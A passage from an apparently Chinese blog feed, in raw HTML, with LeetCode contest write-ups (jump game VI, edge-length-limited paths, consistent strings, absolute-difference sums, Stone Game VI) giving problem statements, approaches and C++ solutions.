href="https://leetcode-cn.com/problems/jump-game-vi" target="_blank" rel="noopener">https://leetcode-cn.com/problems/jump-game-vi</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口 + dp</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>我们设<code>dp[i]</code>表示以到达数组第<code>i</code>个元素的最大得分。实际上我们可以知道枚举如下：<script type="math/tex; mode=display">dp[i] = max(dp[k]_{k=i-k}^{i-1}) + nums[i]</script></li><li>我们设定滑动窗口的大小为<code>k</code>，每次保存连续的<code>k</code>个得分，每次计算第<code>i</code>个元素时，即从前<code>k</code>个得分中取出最大值即可，此时我们可以利用<code>map</code>红黑树的结构，即可在$O(lgk)$的时间复杂度内完成插入元素、删除元素、查询元素。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxResult</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 优先队列中的二元组即为 (f[j], j)</span></span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line">        q.emplace(nums[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> ans = nums[<span class="number">0</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="comment">// 堆顶的 j 不满足限制</span></span><br><span class="line">            <span class="keyword">while</span> (i - q.top().second &gt; k) &#123;</span><br><span class="line">                q.pop();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ans = q.top().first + nums[i];</span><br><span class="line">            q.emplace(ans, i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxResult</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp(n,INT_MIN);</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        cnt[dp[<span class="number">0</span>]]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; n; ++i)&#123;</span><br><span class="line">            dp[i] = cnt.rbegin()-&gt;first + nums[i];</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k)&#123;</span><br><span class="line">                cnt[dp[i-k]]--;</span><br><span class="line">                <span class="keyword">if</span>(cnt[dp[i-k]] == <span class="number">0</span>) cnt.erase(dp[i-k]);</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[dp[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5632-检查边长度限制的路径是否存在"><a href="#5632-检查边长度限制的路径是否存在" class="headerlink" title="5632. 检查边长度限制的路径是否存在"></a>5632. 检查边长度限制的路径是否存在</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个 n 个点组成的无向图边集 <code>edgeList</code> ，其中 <code>edgeList[i] = [ui, vi, disi]</code>表示点 ui 和点 vi 之间有一条长度为 disi 的边。请注意，两个点之间可能有 超过一条边 。</p><p>给你一个查询数组<code>queries</code>，其中 <code>queries[j] = [pj, qj, limitj]</code>，你的任务是对于每个查询 <code>queries[j]</code>，判断是否存在从 pj 到 qj 的路径，且这条路径上的每一条边都 严格小于 limitj 。</p><p>请你返回一个 布尔数组 <code>answer</code>，其中 <code>answer.length == queries.length</code> ，当 <code>queries[j]</code>的查询结果为 true 时， answer 第 j 个值为 true ，否则为 false 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span>, edgeList = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">0</span>,<span class="number">8</span>],[<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>]], queries = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>],[<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span>]]</span><br><span class="line">输出：[<span class="literal">false</span>,<span class="literal">true</span>]</span><br><span class="line">解释：上图为给定的输入数据。注意到 <span class="number">0</span> 和 <span class="number">1</span> 之间有两条重边，分别为 <span class="number">2</span> 和 <span class="number">16</span> 。</span><br><span class="line">对于第一个查询，<span class="number">0</span> 和 <span class="number">1</span> 之间没有小于 <span class="number">2</span> 的边，所以我们返回 <span class="literal">false</span> 。</span><br><span class="line">对于第二个查询，有一条路径（<span class="number">0</span> -&gt; <span class="number">1</span> -&gt; <span class="number">2</span>）两条边都小于 <span class="number">5</span> ，所以这个查询我们返回 <span class="literal">true</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">5</span>, edgeList = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>],[<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">13</span>]], queries = [[<span class="number">0</span>,<span class="number">4</span>,<span class="number">14</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">13</span>]]</span><br><span class="line">输出：[<span class="literal">true</span>,<span class="literal">false</span>]</span><br><span class="line">解释：上图为给定数据。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>2 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= edgeList.length, queries.length &lt;= 105</code></li><li><code>edgeList[i].length == 3</code></li><li><code>queries[j].length == 3</code></li><li><code>0 &lt;= ui, vi, pj, qj &lt;= n - 1</code></li><li><code>ui != vi</code></li><li><code>pj != qj</code></li><li><code>1 &lt;= disi, limitj &lt;= 109</code></li><li>两个点之间可能有 多条 边。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/checking-existence-of-edge-length-limited-paths/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/checking-existence-of-edge-length-limited-paths/</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> kruskal最小生成树算法</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>拿到题目后仔细分析一下<code>query</code>的本质，即判断在当前约束的边的大小限制下，图中的两个点是否连通。由此我们可以联想到最小生成树算法，因为刚好<code>kruskal</code>算法是按照边的大小来进行树的合并。</li><li>由此我们可以知道首先我们将所有的<code>query</code>按照从小到大进行排序，然后我们将当前所有小于当前<code>query</code>的边进行最小集合合并，如果判断当前已经合并的子树中，<code>query</code>的两个顶点是否连通，如果连通则<code>query</code>的结果为<code>true</code>,否则<code>query</code>的结果为<code>false</code>。</li><li>此处需要用到集合合并的算法，对<code>find</code>函数时应尽可能的进行优化，否则会出现超时。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> f[M];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="comment">//if (f[x] != f[f[x]]) f[x] = find(f[x]);</span></span><br><span class="line">    <span class="comment">//while(x != f[x]) x = f[x];</span></span><br><span class="line">    <span class="keyword">while</span>(f[x] != f[f[x]]) f[x] = f[f[x]];</span><br><span class="line">    <span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uni</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x1 = find(x);</span><br><span class="line">    <span class="keyword">int</span> y1 = find(y);</span><br><span class="line">    <span class="keyword">if</span>(x1 == y1) <span class="keyword">return</span>;</span><br><span class="line">    f[x1] = y1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; distanceLimitedPathsExist(<span class="keyword">int</span> n, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; edgeList, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; queries) &#123;</span><br><span class="line">        <span class="keyword">int</span> m = queries.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; ans(m,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">auto</span> cmp = [&amp;](<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)&#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">2</span>] &lt; b[<span class="number">2</span>];</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) queries[i].push_back(i);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) f[i] = i;</span><br><span class="line">        sort(edgeList.begin(),edgeList.end(),cmp);</span><br><span class="line">        sort(queries.begin(),queries.end(),cmp);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(curr &lt; edgeList.size() &amp;&amp; edgeList[curr][<span class="number">2</span>] &lt; queries[i][<span class="number">2</span>])&#123;</span><br><span class="line">                <span class="keyword">int</span> x = find(edgeList[curr][<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">int</span> y = find(edgeList[curr][<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span>(x != y) f[x] = y;</span><br><span class="line">                curr++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ans[queries[i][<span class="number">3</span>]] = find(queries[i][<span class="number">0</span>]) == find(queries[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-220&quot;&gt;&lt;a href=&quot;#leetcode-contest-220&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 220&quot;&gt;&lt;/a&gt;leetcode  contest 220&lt;/h1&gt;&lt;p&gt;本周的题目整体难度不大，&lt;code&gt;hard&lt;/code&gt;难度水平不高，但是需要优化，集合合并和查找时需要优化，否则容易出现超时。&lt;/p&gt;&lt;h2 id=&quot;5629-重新格式化电话号码&quot;&gt;&lt;a href=&quot;#5629-重新格式化电话号码&quot; class=&quot;headerlink&quot; title=&quot;5629. 重新格式化电话号码&quot;&gt;&lt;/a&gt;5629. 重新格式化电话号码&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个字符串形式的电话号码 number 。number 由数字、空格 ‘ ‘、和破折号 ‘-‘ 组成。&lt;/p&gt;&lt;p&gt;请你按下述方式重新格式化电话号码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛41场</title>
    <link href="http://yoursite.com/2020/12/13/235/"/>
    <id>http://yoursite.com/2020/12/13/235/</id>
    <published>2020-12-13T06:03:24.785Z</published>
    <updated>2020-12-13T13:13:13.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biwee-contest-41"><a href="#leetcode-biwee-contest-41" class="headerlink" title="leetcode  biwee contest 41"></a>leetcode  biwee contest 41</h1><p>双周赛的题目果然难度很高，真心很难。</p><h2 id="5609-统计一致字符串的数目"><a href="#5609-统计一致字符串的数目" class="headerlink" title="5609. 统计一致字符串的数目"></a>5609. 统计一致字符串的数目</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个由不同字符组成的字符串 <code>allowed</code>和一个字符串数组 <code>words</code> 。如果一个字符串的每一个字符都在 <code>allowed</code>中，就称这个字符串是 一致 字符串。</p><p>请你返回 <code>words</code> 数组中 一致 字符串的数目。</p><a id="more"></a><p>示例 1：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：allowed = <span class="string">"ab"</span>, <span class="keyword">words</span> = [<span class="string">"ad"</span>,<span class="string">"bd"</span>,<span class="string">"aaab"</span>,<span class="string">"baa"</span>,<span class="string">"badab"</span>]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：字符串 <span class="string">"aaab"</span> 和 <span class="string">"baa"</span> 都是一致字符串，因为它们只包含字符 <span class="string">'a'</span> 和 <span class="string">'b'</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">allowed</span> = <span class="string">"abc"</span>, <span class="attr">words</span> = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"ab"</span>,<span class="string">"ac"</span>,<span class="string">"bc"</span>,<span class="string">"abc"</span>]</span><br><span class="line">输出：<span class="number">7</span></span><br><span class="line">解释：所有字符串都是一致的。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">allowed</span> = <span class="string">"cad"</span>, <span class="attr">words</span> = [<span class="string">"cc"</span>,<span class="string">"acd"</span>,<span class="string">"b"</span>,<span class="string">"ba"</span>,<span class="string">"bac"</span>,<span class="string">"bad"</span>,<span class="string">"ac"</span>,<span class="string">"d"</span>]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：字符串 <span class="string">"cc"</span>，<span class="string">"acd"</span>，<span class="string">"ac"</span> 和 <span class="string">"d"</span> 是一致字符串。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= words.length &lt;= 104</code></li><li><code>1 &lt;= allowed.length &lt;= 26</code></li><li><code>1 &lt;= words[i].length &lt;= 10</code></li><li><code>allowed</code>中的字符 互不相同 。</li><li><code>words[i]</code> 和 <code>allowed</code>只包含小写英文字母。</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/count-the-number-of-consistent-strings" target="_blank" rel="noopener">https://leetcode-cn.com/problems/count-the-number-of-consistent-strings</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  hash统计</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>简单的<code>hash</code>统计即可<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countConsistentStrings</span><span class="params">(<span class="built_in">string</span> a, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">char</span>&gt; A;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : a) A.insert(c);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : b)&#123;</span><br><span class="line">            <span class="keyword">bool</span> valid = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> c : v)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!A.count(c))&#123;</span><br><span class="line">                    valid = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(valid) ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5610-有序数组中差绝对值之和"><a href="#5610-有序数组中差绝对值之和" class="headerlink" title="5610. 有序数组中差绝对值之和"></a>5610. 有序数组中差绝对值之和</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个 非递减 有序整数数组 <code>nums</code> 。</p><p>请你建立并返回一个整数数组 <code>result</code>，它跟 nums 长度相同，且<code>result[i]</code> 等于<code>nums[i]</code>与数组中所有其他元素差的绝对值之和。</p><p>换句话说， <code>result[i]</code>等于<code>sum(|nums[i]-nums[j]|)</code>，其中 <code>0 &lt;= j &lt; nums.length</code> 且 <code>j != i</code>（下标从 0 开始）。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">输出：[<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">解释：假设数组下标从 <span class="number">0</span> 开始，那么</span><br><span class="line">result[<span class="number">0</span>] = |<span class="number">2</span><span class="number">-2</span>| + |<span class="number">2</span><span class="number">-3</span>| + |<span class="number">2</span><span class="number">-5</span>| = <span class="number">0</span> + <span class="number">1</span> + <span class="number">3</span> = <span class="number">4</span>，</span><br><span class="line">result[<span class="number">1</span>] = |<span class="number">3</span><span class="number">-2</span>| + |<span class="number">3</span><span class="number">-3</span>| + |<span class="number">3</span><span class="number">-5</span>| = <span class="number">1</span> + <span class="number">0</span> + <span class="number">2</span> = <span class="number">3</span>，</span><br><span class="line">result[<span class="number">2</span>] = |<span class="number">5</span><span class="number">-2</span>| + |<span class="number">5</span><span class="number">-3</span>| + |<span class="number">5</span><span class="number">-5</span>| = <span class="number">3</span> + <span class="number">2</span> + <span class="number">0</span> = <span class="number">5</span>。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line">输出：[<span class="number">24</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">21</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>2 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= nums[i + 1] &lt;= 104</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/sum-of-absolute-differences-in-a-sorted-array" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sum-of-absolute-differences-in-a-sorted-array</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口前缀和</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>前缀和即可。题目非常简单<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; getSumAbsoluteDifferences(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; sum(n+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            sum[i+<span class="number">1</span>] = sum[i] + A[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> l = (sum[n] - sum[i]) - (n-i)*A[i];</span><br><span class="line">            <span class="keyword">int</span> r = i*A[i] - sum[i];</span><br><span class="line">            ans.push_back(l+r);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5611-石子游戏-VI"><a href="#5611-石子游戏-VI" class="headerlink" title="5611. 石子游戏 VI"></a>5611. 石子游戏 VI</h2><p><code>Alice</code> 和 <code>Bob</code>轮流玩一个游戏，<code>Alice</code>先手。</p><p>一堆石子里总共有 n 个石子，轮到某个玩家时，他可以 移出 一个石子并得到这个石子的价值。<code>Alice</code>和 <code>Bob</code>对石子价值有 不一样的的评判标准 。</p><p>给你两个长度为 n 的整数数组 <code>aliceValues</code> 和 <code>bobValues</code> 。<code>aliceValues[i]</code>和 <code>bobValues[i]</code> 分别表示 <code>Alice</code> 和 <code>Bob</code>认为第 i 个石子的价值。</p><p>所有石子都被取完后，得分较高的人为胜者。如果两个玩家得分相同，那么为平局。两位玩家都会采用 最优策略 进行游戏。</p><p>请你推断游戏的结果，用如下的方式表示：</p><ul><li>如果 Alice 赢，返回 1 。</li><li>如果 Bob 赢，返回 -1 。</li><li>如果游戏平局，返回 0 。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：aliceValues = [<span class="number">1</span>,<span class="number">3</span>], bobValues = [<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：</span><br><span class="line">如果 Alice 拿石子 <span class="number">1</span> （下标从 <span class="number">0</span>开始），那么 Alice 可以得到 <span class="number">3</span> 分。</span><br><span class="line">Bob 只能选择石子 <span class="number">0</span> ，得到 <span class="number">2</span> 分。</span><br><span class="line">Alice 获胜。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：aliceValues = [<span class="number">1</span>,<span class="number">2</span>], bobValues = [<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：</span><br><span class="line">Alice 拿石子 <span class="number">0</span> ， Bob 拿石子 <span class="number">1</span> ，他们得分都为 <span class="number">1</span> 分。</span><br><span class="line">打平。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 